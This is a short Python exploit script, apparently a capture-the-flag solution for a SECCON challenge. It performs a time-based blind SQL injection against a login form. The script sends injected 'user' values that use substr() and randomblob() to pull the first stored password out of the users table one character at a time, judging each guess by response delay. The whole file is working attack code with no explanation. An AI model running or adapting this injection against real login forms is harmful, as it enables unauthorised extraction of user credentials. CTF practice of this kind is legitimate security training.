#!/usr/bin/env python

import requests
import time

url = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
sourcestr = '1234567890abcdef'
idx = 0
result = ""

while True:
    print("[*] CURRENT RESULT: %s" % result)
    idx += 1

    data = {
        "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(100000000) and 'a'='a" % (idx, ''),
        "pass": "password",
        "login": "Login"
    }
    start = time.time()
    res = requests.post(url, data=data)
    ellapse = time.time() - start

    if(ellapse > 1):
        break
    else:
        pass

    for x in sourcestr:
        data = {
            "user": "test' or substr((select password from users limit 1 offset 0),%d,1)='%s' and randomblob(100000000) and 'a'='a" % (idx, x),
            "pass": "password",
            "login": "Login"
        }
        print("[*] Test: %s" % x)
        start = time.time()
        res = requests.post(url, data=data)
        ellapse = time.time() - start

        if(ellapse > 1):
            result += x
            print("[+] Hit: %s" % x)
            break
        else:
            pass

print("[+] FINAL RESULT: %s" % result)
